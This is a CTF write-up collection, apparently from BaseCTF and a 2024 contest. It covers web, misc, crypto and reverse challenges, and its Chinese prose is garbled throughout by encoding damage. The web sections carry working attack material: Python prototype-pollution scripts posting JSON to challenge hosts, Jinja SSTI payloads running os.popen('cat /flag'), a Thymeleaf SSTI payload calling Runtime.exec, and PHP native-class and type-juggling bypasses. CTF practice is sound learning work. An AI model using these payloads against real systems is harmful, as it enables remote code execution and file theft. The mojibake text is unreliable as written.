basectf\n\nåœ¨basectfæ–‡ä»¶å¤¹ä¸‹å¯ä»¥çœ‹åˆ°gitæ³„éœ²çš„æ–‡ä»¶ï¼Œè¿›å…¥åˆ°ç›®æ ‡æ–‡ä»¶å¤¹ä¸‹\n1git log #æŸ¥çœ‹gitæ—¥å¿—\n\n\n\nçœ‹åˆ°ä¸¤æ¡ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¡ä¿¡æ¯æ˜¯æ·»åŠ ä»€ä¹ˆä¸œè¥¿ï¼Œè¿›è€ŒæŸ¥çœ‹ç¬¬ä¸€æ¡ä¿¡æ¯\n1git checkout 9d85f10e0192ef630e10d7f876a117db41c30417\n\nflag.txtæ–‡ä»¶æ¢å¤\nflagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼ŸphpåŸç”Ÿç±»çš„ä½¿ç”¨1234567891011121314&lt;?phphighlight_file(&#x27;index.php&#x27;);# æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~error_reporting(0);$J1ng = $_POST[&#x27;J&#x27;];$Hong = $_POST[&#x27;H&#x27;];$Keng = $_GET[&#x27;K&#x27;];$Wang = $_GET[&#x27;W&#x27;];$dir = new $Keng($Wang);foreach($dir as $f) &#123;    echo($f . &#x27;&lt;br&gt;&#x27;);&#125;echo new $J1ng($Hong);?&gt;\n\nè¿‡äºç®€å•ç›´æ¥é™„ä¸Špayload\n1234GET:?K=FilesystemIterator&amp;W=glob:///secret/*POST:SplFileObject&amp;H=php://filter/convert.base64-encode/resource=/secret/f11444g.php\n\nå‚è€ƒæ–‡ç« ï¼šhttps://xz.aliyun.com/t/13785?time__1311=GqmxuQi%3De7qeqGNDQi5BIKY5bRGKOOa4D#toc-0\nJinja MarkpythonåŸå‹é“¾æ±¡æŸ“\npythonåŸå‹é“¾æ±¡æŸ“ä¾‹å­\n\n12345678910111213141516171819202122232425262728293031323334353637a = 1def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)def demo():    passclass A:    def __init__(self):        passclass B:    classa = 2instance = A()payload = &#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;a&quot;: 4,            &quot;B&quot;: &#123;                &quot;classa&quot;: 5            &#125;        &#125;    &#125;&#125;print(B.classa)  # 2print(a)         # 1merge(payload, instance)print(B.classa)  # 5print(a)         # 4\n\nå‚è€ƒæ–‡ç« https://xz.aliyun.com/t/13072#toc-13\nç»•è¿‡é»‘åå•è¿›å…¥åˆ°&#x2F;index è¿›è¡Œsstiæ³¨å…¥å‘ç°æœ‰é»‘åå•ï¼ŒæŸ¥çœ‹æç¤ºå‘ç°æ˜¯\n123456789101112131415161718192021BLACKLIST_IN_index = [&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)@app.route(&#x27;/magic&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def pollute():    if request.method == &#x27;POST&#x27;:        if request.is_json:            merge(json.loads(request.data), instance)            return &quot;è¿™ä¸ªé­”æœ¯è¿˜è¡Œå§&quot;        else:            return &quot;æˆ‘è¦jsonçš„é­”æœ¯&quot;    return &quot;è®°å¾—ç”¨POSTæ–¹æ³•æŠŠé­”æœ¯äº¤ä¸Šæ¥&quot;\n\néœ€è¦å°†é»‘åå•banæ‰ï¼Œå°†payloadä»¥jsonçš„æ ¼å¼é€šè¿‡POSTä¼ å…¥ &#x2F;magic expå¦‚ä¸‹\n12345678910111213141516171819202122232425262728293031323334import requestsimport json# æ„å»ºè¦å‘é€çš„ payloadpayload = &#123;    &quot;__class__&quot;: &#123;        &quot;__init__&quot;: &#123;            &quot;__globals__&quot;: &#123;                &quot;BLACKLIST_IN_index&quot;: []            &#125;        &#125;    &#125;&#125;# å°† payload è½¬æ¢ä¸º JSON æ ¼å¼json_payload = json.dumps(payload)# å®šä¹‰ URLurl = &quot;http://gz.imxbt.cn:20155/magic&quot;# æ‰“å°è¯·æ±‚çš„é”®å’Œå€¼print(&quot;è¯·æ±‚çš„ URL:&quot;, url)print(&quot;è¯·æ±‚çš„å¤´éƒ¨ä¿¡æ¯:&quot;, &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)print(&quot;è¯·æ±‚çš„ Payload:&quot;, json_payload)try:    # å‘é€ POST è¯·æ±‚    response = requests.post(url, data=json_payload, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)    # æ‰“å°å“åº”å†…å®¹    print(&quot;çŠ¶æ€ç :&quot;, response.status_code)    print(&quot;å“åº”å†…å®¹:&quot;, response.text)except requests.exceptions.RequestException as e:    print(&quot;è¯·æ±‚å‘ç”Ÿé”™è¯¯:&quot;, e)\n\n1234567payload = &#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;BLACKLIST_IN_index&quot;: []        &#125;    &#125;&#125;\n\nå‘é€å“åº”çš„jsonå­—ç¬¦ä¸²\n\nSSTIæ³¨å…¥å†æ¬¡è¿›è¡Œsstiæ³¨å…¥å‘ç°æ— é»‘åå•\næœ€ç»ˆpayload:\n12&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; &#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;\n\nåœ£é’¥ä¹‹æˆ˜1.0ç‰¹æ®Šå˜é‡ä¸åŸå‹é“¾æ±¡æŸ“çš„å…³ç³»åœ¨&#x2F;readè·¯ç”±ä¸‹çœ‹åˆ°\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst):    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)def is_json(data):    try:        json.loads(data)        return True    except ValueError:        return Falseclass cls():    def __init__(self):        passinstance = cls()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def hello_world():    return open(&#x27;/static/index.html&#x27;, encoding=&quot;utf-8&quot;).read()@app.route(&#x27;/read&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def Read():    file = open(__file__, encoding=&quot;utf-8&quot;).read()    return f&quot;J1ngHongè¯´ï¼šä½ æƒ³read flagå—ï¼Ÿé‚£ä¹ˆåœ£é’¥ä¹‹å…‰å¿…å°†é˜»æ­¢ä½ ï¼ä½†æ˜¯å°å°çš„æºç æ²¡äº‹ï¼Œå› ä¸ºä½ ä¹Ÿè¯»ä¸åˆ°flag(ä¹)&#123;file&#125;&quot;@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def Pollution():    if request.is_json:        merge(json.loads(request.data),instance)    else:        return &quot;J1ngHongè¯´ï¼šé’¥åŒ™åœ£æ´æ— æš‡ï¼Œæ— äººå¯ä»¥æ±¡æŸ“ï¼&quot;    return &quot;J1ngHongè¯´ï¼šåœ£é’¥æš—æ·¡äº†ä¸€ç‚¹ï¼Œä½ å±…ç„¶æ±¡æŸ“æˆåŠŸäº†ï¼Ÿ&quot;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80)\n\nçœ‹åˆ°&#x2F;readè·¯ç”±æ˜¯é€šè¿‡__file__æ¥è¯»å–æ–‡ä»¶ï¼Œ__file__çš„å€¼å¯ä»¥é€šè¿‡mergeæ¥ä¿®æ”¹ï¼Œç›´æ¥æ„é€ payload\n123456789101112131415161718192021222324252627282930313233import requestsimport json# æ„å»ºè¦å‘é€çš„ payloadpayload = &#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;__file__&quot;: &quot;flag&quot; #/proc/1/environ        &#125;    &#125;&#125;# å°† payload è½¬æ¢ä¸º JSON æ ¼å¼json_payload = json.dumps(payload)# å®šä¹‰ URLurl = &quot;http://gz.imxbt.cn:20199/pollute&quot;# æ‰“å°è¯·æ±‚çš„é”®å’Œå€¼print(&quot;è¯·æ±‚çš„ URL:&quot;, url)print(&quot;è¯·æ±‚çš„å¤´éƒ¨ä¿¡æ¯:&quot;, &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)print(&quot;è¯·æ±‚çš„ Payload:&quot;, json_payload)try:    # å‘é€ POST è¯·æ±‚    response = requests.post(url, data=json_payload, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)    # æ‰“å°å“åº”å†…å®¹    print(&quot;çŠ¶æ€ç :&quot;, response.status_code)    print(&quot;å“åº”å†…å®¹:&quot;, response.text)except requests.exceptions.RequestException as e:    print(&quot;è¯·æ±‚å‘ç”Ÿé”™è¯¯:&quot;, e)\n\nå†æ¬¡è®¿é—®&#x2F;readå³å¯\n/proc/1/environ æ–‡ä»¶ç”¨äºå­˜æ”¾è¿›ç¨‹ ID ä¸º 1 çš„è¿›ç¨‹ï¼ˆé€šå¸¸æ˜¯ init æˆ– systemdï¼‰çš„ç¯å¢ƒå˜é‡ã€‚è¯¥æ–‡ä»¶åŒ…å«äº†ä¸€ç³»åˆ—ä»¥ç©ºå­—ç¬¦ (\\0) åˆ†éš”çš„ç¯å¢ƒå˜é‡ï¼Œè¿™äº›å˜é‡åœ¨è¿›ç¨‹å¯åŠ¨æ—¶è¢«è®¾ç½®\nå¾¡ç½‘2024wpmiscä¿¡æ¯å®‰å…¨å¤§èµ›çš„é€šçŸ¥ctrl+Aå¤åˆ¶åˆ°è®°äº‹æœ¬çœ‹åˆ°flag\n\nç¼–ç è½¬æ¢ç¬¬ä¸€æ®µBrainfuck \n\nç¬¬äºŒæ®µJSFUCK\n\nç¬¬ä¸‰æ®µBrainfuck \n\ncoding_analyse1&amp;#x39;&amp;#x33;&amp;#x36;&amp;#x35;&amp;#x34;&amp;#x34;&amp;#x61;&amp;#x35;&amp;#x35;&amp;#x33;&amp;#x31;&amp;#x34;&amp;#x61;&amp;#x37;&amp;#x65;&amp;#x34;&amp;#x33;&amp;#x33;&amp;#x39;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x66;&amp;#x34;&amp;#x37;&amp;#x37;&amp;#x37;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x65;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x31;&amp;#x35;&amp;#x61;&amp;#x37;&amp;#x64;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x35;&amp;#x37;&amp;#x34;&amp;#x33;&amp;#x35;&amp;#x37;&amp;#x35;&amp;#x36;&amp;#x35;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x35;&amp;#x62;&amp;#x34;&amp;#x34;&amp;#x37;&amp;#x38;&amp;#x35;&amp;#x31;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x35;&amp;#x33;&amp;#x37;&amp;#x34;&amp;#x31;&amp;#x36;\n\nè½¬æ¢ç¼–ç ä¸º16è¿›åˆ¶å¹¶é€†åºè¾“å‡º\n16147356a6158744b55455657534752314d7a51314e6a67774f5459334e7a41355a445639\n\n16è¿›åˆ¶è½¬ascii\n1aG5jaXtKUEVWSGR1MzQ1NjgwOTY3NzA5ZDV9\n\nbase64 rot13\n\n\nWEBinput_datasvnæ³„éœ²è®¿é—®&#x2F;.svn\næ–‡ä»¶ä¸€ä¸ªä¸ªçœ‹å‘ç°flag\n\nadminçœ‹è§æŠ¥é”™é¡µé¢çŸ¥é“æ˜¯springbootæ¡†æ¶\næœç´¢springboot sstiçœ‹åˆ°åˆ°thymeleaf SSTI æ¼æ´\næ‰«æç›®å½•å’Œæµ‹è¯•å‚æ•°å¯çŸ¥\nhttp://101.200.58.4:3333//admin/?path=\næ ¹æ®æ–‡ç« ä»¿é€ payload\næ–‡ç« payload\n\né¢˜ç›®payload\nhttp://101.200.58.4:3333//admin/?path=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__**::x**\n\nFlaskä¸‹è½½é™„ä»¶å¯å¾—å‚æ•°evalme,æŸ¥çœ‹ä»£ç æœ¬è´¨å°±æ˜¯è¯»å–æ–‡ä»¶\néœ€è¦ç»•è¿‡è¿‡æ»¤ï¼Œpythonä¸­%cæ˜¯å ä½ç¬¦\n12formatted_string = &quot;%c%c%c%c%c&quot; % (47, 102, 108, 97, 103)print(formatted_string) \n\nä½¿ç”¨è¿™ç§æ–¹å¼å¯ä»¥æ›¿ä»£ &#x2F;flag,åœ¨è¿›è¡Œurlç¼–ç è¯»å–flag\npayload:\nhttp://101.200.58.4:1111/?evalme=%22%c%c%c%c%c%22%(47,102,108,97,103)\nå¦‚æ­¤å¤šçš„FLAGæºä»£ç çœ‹åˆ°F1aaj.php\nè®¿é—®çœ‹åˆ°å‡flagï¼Œäºæ˜¯ç»§ç»­æŸ¥çœ‹é¡µé¢ï¼Œ\nç›®å½•æ‰«é¢æ— æœ\næŸ¥çœ‹æºä»£ç æ— æœ\næŠ“åŒ…æŸ¥çœ‹cookieæœ‰FFLLL4g.php\nè®¿é—®é¡µé¢\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 &lt;?phphighlight_file(__FILE__);if (isset($_GET[&#x27;X&#x27;])) &#123;    $temp = $_GET[&#x27;X&#x27;];    if (!is_numeric($temp)) &#123;        die(&quot;no numeric&quot;);    &#125;    if ($temp &gt; 9999) &#123;        echo &quot;&lt;br&gt;Pupil.&lt;/br&gt;&quot;;    &#125; else &#123;        die(&quot;NO!NO!NO!&quot;);    &#125;&#125; else &#123;    die(&quot;Where is X?&quot;);&#125;if (isset($_GET[&#x27;Y&#x27;])) &#123;    $md5 = $_GET[&#x27;Y&#x27;];    if ($md5 == md5($md5)) &#123;        echo &quot;Junior school student.&lt;/br&gt;&quot;;    &#125; else &#123;        die(&quot;NO!NO!NO!&quot;);    &#125;&#125; else &#123;    die(&quot;Where is Y?&quot;);&#125;if (isset($_GET[&#x27;Z&#x27;])) &#123;    $content = $_GET[&#x27;Z&#x27;];    if (strlen($content) &gt;= 60) &#123;        die(&quot;No long!&quot;);    &#125;    $blacklist = array(&#x27;,&#x27;, &#x27;&quot;&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;, &#x27;\\0&#x27;, &#x27;&#x27;, &#x27;t&#x27;, &#x27;x&#x27;, &#x27;m&#x27;);    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;            die(&quot;NO!NO!NO!&quot;);        &#125;    &#125;    $security = array(&#x27;abs&#x27;, &#x27;base_convert&#x27;, &#x27;cos&#x27;, &#x27;dechex&#x27;, &#x27;exp&#x27;, &#x27;flag&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;is_nan&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;sin&#x27;, &#x27;tan&#x27;);    preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs);    foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $security)) &#123;            die(&quot;NO!NO!NO!&quot;);        &#125;    &#125;    eval(&#x27;echo &#x27; .$content.&#x27;;&#x27;);    if (isset($flag)) &#123;        if ($flag == &quot;flag&quot;) &#123;            echo &quot;Senior high school student.&lt;/br&gt;&quot;;            echo &quot;Here_is_flag!!!!!!!&quot;;        &#125;    &#125;&#125;?&gt; \n\nGET:X&#x3D;9999.1&amp;Y&#x3D;0e9835462117&amp;Z&#x3D;1;$flag&#x3D;0\nXè¿›è¡Œå°æ•°ç‚¹ç»•è¿‡\nYè¿›è¡Œ0eå¼€å¤´MD5ç»•è¿‡\nZè¿›è¡Œå˜é‡è¦†ç›–ï¼Œå‘ç°æ‰“å°å‡ºè®¸å¤šflagæ–‡ä»¶\n\nè®¿é—®ç¬¬ä¸‰ä¸ªæ˜¯çœŸçš„\n\nCRYPTOä¸å°å¿ƒï¼Œä¸‹è½½é™„ä»¶ä¹‹åå‘ç°ä¸22å¹´æ²³åŒ—é“¶è¡Œ æ‰‹æŠ–çš„å°æ˜ä¸€æ ·\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# coding:utf-8# python 3.6# from flag import flag# import res = &quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;# assert re.match(r&#x27;^DASCTF\\&#123;[a-f0-9]+\\&#125;$&#x27;,flag) != Noneflag = &quot;DASCTF&#123;&quot;def encode(inputs):    bin_str = []    for i in inputs:        x = str(bin(ord(i))).replace(&#x27;0b&#x27;, &#x27;&#x27;)        bin_str.append(&#x27;&#123;:0&gt;8&#125;&#x27;.format(x))    outputs = &quot;&quot;    nums = 0    while bin_str:        temp_list = bin_str[:3]        if (len(temp_list) != 3):            nums = 3 - len(temp_list)            while len(temp_list) &lt; 3:                temp_list += [&#x27;0&#x27; * 8]        temp_str = &quot;&quot;.join(temp_list)        temp_str_list = []        for i in range(0, 4):            temp_str_list.append(int(temp_str[i * 6:(i + 1) * 6], 2))        if nums:            temp_str_list = temp_str_list[0:4 - nums]        for i in temp_str_list:            outputs += s[i]        bin_str = bin_str[3:]    outputs += nums * &#x27;=&#x27;    return outputs# c = encode(flag)# print(c)s = &quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;h = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;c = &#x27;+Se++h+mF5u0d++Oc++RbQJYbyuMb++0cYuQc+SwdmK0d+fwcYRYG+&#x27;#    +Se++h+mFYVPJv+zb+SYK+V4dvKRKQSXJ+uzJ++zJ+uRK3JXK+bYG+==m = &#x27;&#x27;for i in c:    print(s.index(i))    p = s.index(i)    m += h[p]print(m)# m = &quot;fQ==&quot; #from base64 import *import stringss = b&#x27;0123456789abcdef-_&#123;&#125;&#x27;# ss = string.printable.encode()def aaa(idx, mm):    # print(mm, idx)    if idx &gt;= 4:        # print(idx, mm)        try:            t = b64decode(mm)        except:            return            # print(t)        for v in t:            if v not in ss:                break        else:            print(&quot;xxx &quot;, t)        return    if mm[idx] == &#x27;Q&#x27;:        for v in &quot;QRSTU&quot;:            if idx == 0:                aaa(idx + 1, v + mm[1:])            elif idx == 3:                aaa(idx + 1, mm[0:3] + v)            else:                aaa(idx + 1, mm[0:idx] + v + mm[idx + 1:])    else:        aaa(idx + 1, mm)m = &#x27;QEFQQ1QGezc4YWQhMQEzZQcwOWZkZjEyYQVhYQQhYQVkZDYyZQMzfQ==&#x27;m = m[8:]  # GASCTFfor v in range(0, len(m), 4):    print(&#x27;---------&#x27;, v, m[v: v + 4])    aaa(0, m[v: v + 4])\n\nå°†å¯†æ–‡æ›¿æ¢å³å¯\nè§£å¯†flagæ‹¼æ¥ç”¨flag{}åŒ…è£¹\nReverseez_apkå†apkæ–‡ä»¶ä¸­æ‰¾åˆ°AndroidMainfest.xmlå¹¶æŸ¥çœ‹ç›¸å…³å‡½æ•°\n12345678910111213141516171819202122232425\tpublic void onStart()&#123;\t\tsuper.onstart();\t\tString string getstring(R.string.cipher);\t\tbyte[]bytes string.getBytes();\t\tfor (int i=0;i&lt;string.length();i++)&#123;\t\t\tbytes[i]=(byte)(bytes[i]^i);\t\t&#125;\t\tthis.cipher new string(bytes);&#125;        public boolean checkcin(String str) &#123;        byte[] bytes = getString(R.string.key).getBytes();        char[] charArray = str.toCharArray();        char[] cArr = new char[charArray.length];        for (int i = 0; i &lt; charArray.length; i++) &#123;            if (charArray[i] == &#x27;_&#x27; || charArray[i] == &#x27;&#123;&#x27; || charArray[i] == &#x27;&#125;&#x27;) &#123;                cArr[i] = charArray[i];            &#125; else if (charArray[i] &lt; &#x27;a&#x27; || charArray[i] &gt; &#x27;z&#x27;) &#123;                break;            &#125; else &#123;                cArr[i] = (char) (((((bytes[i % bytes.length] - 97) + charArray[i]) - 97) % 26) + 97);            &#125;        &#125;        return this.cipher.equals(new String(cArr));    &#125;\n\nå¯ä»¥çœ‹å‡ºåœ¨å‡½æ•°ä¸­è¿›è¡Œä¸€æ¬¡å¼‚æˆ–ï¼Œå°†å­—èŠ‚è¿›è¡Œå¼‚æˆ–è¿ç®—ä»¥ç”Ÿæˆæ–°çš„å­—èŠ‚æ•°ç»„ã€‚æœ€åå°†å…¶è½¬å›å­—ç¬¦ä¸²å­˜å‚¨åœ¨cipherä¸­\n123cArr[i] = (char) (((((bytes[i % bytes.length] - 97) + charArray[i]) - 97) % 26) + 97);#bytes[i % bytes.length] ä»å¯†é’¥å­—èŠ‚æ•°ç»„ä¸­è·å–å½“å‰å­—èŠ‚ã€‚#å­—ç¬¦è½¬æ¢: charArray[i] - 97 å°†å­—ç¬¦è½¬æ¢ä¸ºä»0å¼€å§‹çš„ç´¢å¼•ï¼ˆä¾‹å¦‚ï¼Œ&#x27;a&#x27; -&gt; 0, &#x27;b&#x27; -&gt; 1, ..., &#x27;z&#x27; -&gt; 25ï¼‰ã€‚\n\næ­¤å¤„è¿›è¡ŒåŠ å¯†ï¼ˆå‡¯æ’’å˜ç§åŠ å¯†ï¼‰å°†å…³é”®è¯æå–å‡ºæ¥ï¼Œç”¨pyç¼–å†™è§£å¯†è„šæœ¬\n123456789101112131415161718def check_cin(s, key):    bytes_key = key.encode()     c_arr = []    for i, char in enumerate(s):        if char in [&#x27;_&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;]:            c_arr.append(char)        elif &#x27;a&#x27; &lt;= char &lt;= &#x27;z&#x27;:            shift = bytes_key[i % len(bytes_key)] - 97            new_char = chr((ord(char) - 97 - shift) % 26 + 97)            c_arr.append(new_char)        else:            break    return &#x27;&#x27;.join(c_arr)key = &quot;aptxcony&quot; result = check_cin(&quot;fatd&#123;sm_cgrmvc_ylvhokhuk_gxsgffc_wtec&#125;&quot;, key)print(result)#å¾—åˆ°flag flag&#123;ez_crypto_algorithm_reverse_haha&#125;\n\næœºå™¨çŒ«å°†pyé™„ä»¶è¿›è¡Œåç¼–è¯‘\n123python pyinstxtractor.py 2.exeuncompyle6 2.pyc &gt; 2.py#æ‰“å¼€2.py\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274# uncompyle6 version 3.9.2# Python bytecode version base 3.8.0 (3413)# Decompiled from: Python 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:36:42) [MSC v.1929 64 bit (AMD64)]# Embedded file name: 2.pyimport turtledef flyTo(x, y):    turtle.penup()    turtle.goto(x, y)    turtle.pendown()def drawEye():    turtle.tracer(False)    a = 2.5    for i in range(120):        if not 0 &lt;= i &lt; 30:            if 60 &lt;= i &lt; 90:                a -= 0.05        else:            a += 0.05        turtle.left(3)        turtle.fd(a)    else:        turtle.tracer(True)def beard():    flyTo(-37, 135)    turtle.seth(165)    turtle.fd(60)    flyTo(-37, 125)    turtle.seth(180)    turtle.fd(60)    flyTo(-37, 115)    turtle.seth(193)    turtle.fd(60)    flyTo(37, 135)    turtle.seth(15)    turtle.fd(60)    flyTo(37, 125)    turtle.seth(0)    turtle.fd(60)    flyTo(37, 115)    turtle.seth(-13)    turtle.fd(60)def drawRedScarf():    turtle.fillcolor(&quot;red&quot;)    turtle.begin_fill()    turtle.seth(0)    turtle.fd(200)    turtle.circle(-5, 90)    turtle.fd(10)    turtle.circle(-5, 90)    turtle.fd(207)    turtle.circle(-5, 90)    turtle.fd(10)    turtle.circle(-5, 90)    turtle.end_fill()def drawMouse():    flyTo(5, 148)    turtle.seth(270)    turtle.fd(100)    turtle.seth(0)    turtle.circle(120, 50)    turtle.seth(230)    turtle.circle(-120, 100)def drawRedNose():    flyTo(-10, 158)    turtle.fillcolor(&quot;red&quot;)    turtle.begin_fill()    turtle.circle(20)    turtle.end_fill()def drawBlackdrawEye():    turtle.seth(0)    flyTo(-20, 195)    turtle.fillcolor(&quot;#000000&quot;)    turtle.begin_fill()    turtle.circle(13)    turtle.end_fill()    turtle.pensize(6)    flyTo(20, 205)    turtle.seth(75)    turtle.circle(-10, 150)    turtle.pensize(3)    flyTo(-17, 200)    turtle.seth(0)    turtle.fillcolor(&quot;#ffffff&quot;)    turtle.begin_fill()    turtle.circle(5)    turtle.end_fill()    flyTo(0, 0)def drawFace():    turtle.forward(183)    turtle.fillcolor(&quot;white&quot;)    turtle.begin_fill()    turtle.left(45)    turtle.circle(120, 100)    turtle.seth(90)    drawEye()    turtle.seth(180)    turtle.penup()    turtle.fd(60)    turtle.pendown()    turtle.seth(90)    drawEye()    turtle.penup()    turtle.seth(180)    turtle.fd(64)    turtle.pendown()    turtle.seth(215)    turtle.circle(120, 100)    turtle.end_fill()def drawHead():    turtle.penup()    turtle.circle(150, 40)    turtle.pendown()    turtle.fillcolor(&quot;#00a0de&quot;)    turtle.begin_fill()    turtle.circle(150, 280)    turtle.end_fill()def drawAll():    drawHead()    drawRedScarf()    drawFace()    drawRedNose()    drawMouse()    beard()    flyTo(0, 0)    turtle.seth(0)    turtle.penup()    turtle.circle(150, 50)    turtle.pendown()    turtle.seth(30)    turtle.fd(40)    turtle.seth(70)    turtle.circle(-30, 270)    turtle.fillcolor(&quot;#00a0de&quot;)    turtle.begin_fill()    turtle.seth(230)    turtle.fd(80)    turtle.seth(90)    turtle.circle(1000, 1)    turtle.seth(-89)    turtle.circle(-1000, 10)    turtle.seth(180)    turtle.fd(70)    turtle.seth(90)    turtle.circle(30, 180)    turtle.seth(180)    turtle.fd(70)    turtle.seth(100)    turtle.circle(-1000, 9)    turtle.seth(-86)    turtle.circle(1000, 2)    turtle.seth(230)    turtle.fd(40)    turtle.circle(-30, 230)    turtle.seth(45)    turtle.fd(81)    turtle.seth(0)    turtle.fd(203)    turtle.circle(5, 90)    turtle.fd(10)    turtle.circle(5, 90)    turtle.fd(7)    turtle.seth(40)    turtle.circle(150, 10)    turtle.seth(30)    turtle.fd(40)    turtle.end_fill()    turtle.seth(70)    turtle.fillcolor(&quot;#FFFFFF&quot;)    turtle.begin_fill()    turtle.circle(-30)    turtle.end_fill()    flyTo(103.74, -182.59)    turtle.seth(0)    turtle.fillcolor(&quot;#FFFFFF&quot;)    turtle.begin_fill()    turtle.fd(15)    turtle.circle(-15, 180)    turtle.fd(90)    turtle.circle(-15, 180)    turtle.fd(10)    turtle.end_fill()    flyTo(-96.26, -182.59)    turtle.seth(180)    turtle.fillcolor(&quot;#FFFFFF&quot;)    turtle.begin_fill()    turtle.fd(15)    turtle.circle(15, 180)    turtle.fd(90)    turtle.circle(15, 180)    turtle.fd(10)    turtle.end_fill()    flyTo(-133.97, -91.81)    turtle.seth(50)    turtle.fillcolor(&quot;#FFFFFF&quot;)    turtle.begin_fill()    turtle.circle(30)    turtle.end_fill()    flyTo(-103.42, 15.09)    turtle.seth(0)    turtle.fd(38)    turtle.seth(230)    turtle.begin_fill()    turtle.circle(90, 260)    turtle.end_fill()    flyTo(5, -40)    turtle.seth(0)    turtle.fd(70)    turtle.seth(-90)    turtle.circle(-70, 180)    turtle.seth(0)    turtle.fd(70)    flyTo(-103.42, 15.09)    turtle.fd(90)    turtle.seth(70)    turtle.fillcolor(&quot;#ffd200&quot;)    turtle.begin_fill()    turtle.circle(-20)    turtle.end_fill()    turtle.seth(170)    turtle.fillcolor(&quot;#ffd200&quot;)    turtle.begin_fill()    turtle.circle(-2, 180)    turtle.seth(10)    turtle.circle(-100, 22)    turtle.circle(-2, 180)    turtle.seth(170)    turtle.circle(100, 22)    turtle.end_fill()    flyTo(-13.42, 15.09)    turtle.seth(250)    turtle.circle(20, 110)    turtle.seth(90)    turtle.fd(15)    turtle.dot(10)    flyTo(0, -150)    drawBlackdrawEye()def main():    turtle.screensize(800, 6000, &quot;#F0F0F0&quot;)    turtle.pensize(3)    turtle.speed(9)    drawAll()    turtle.penup()    turtle.goto(100, -300)    turtle.write(&quot;by peak&quot;, font=(&#x27;Bradley Hand ITC&#x27;, 30, &#x27;bold&#x27;))if __name__ == &quot;__main__&quot;:    main()turtle.mainloop()print(&quot;fVJXNjE0ODBpM2RrZmNSVzYxNDgwaTNka01BSlVPe25oc20=&quot;)# okay decompiling 